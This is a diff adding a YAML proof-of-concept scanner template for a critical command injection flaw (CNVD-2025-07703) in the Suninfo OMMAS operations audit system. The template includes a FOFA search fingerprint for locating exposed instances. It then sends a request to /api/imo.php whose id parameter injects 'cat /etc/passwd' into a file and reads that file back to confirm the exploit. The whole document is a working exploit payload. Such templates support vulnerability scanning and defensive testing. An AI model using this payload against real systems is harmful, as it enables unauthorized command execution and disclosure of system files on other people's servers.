@@ -1,0 +1,20 @@
+id: poc-yaml-suninfo-ommas-command-injection-cnvd-2025-07703
+info:
+  name: 上讯信息运维管理审计系统 命令注入漏洞(CNVD-2025-07703)
+  severity: critical
+  tags:
+  - 命令注入
+  - CNVD-2025-07703
+  finger: 上讯信息运维管理审计系统
+  fofa: body="default/getloginhtml"
+variables:
+  t1: random_str(4)
+requests:
+- method: GET
+  path: /api/imo.php?type=immediate&id=|cat%20/etc/passwd>{{.t1}}.txt|
+  expression: status_code == 200 && contains(body,"\"state\":\"true\"") && !contains(body,"<")
+- method: GET
+  path: /api/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
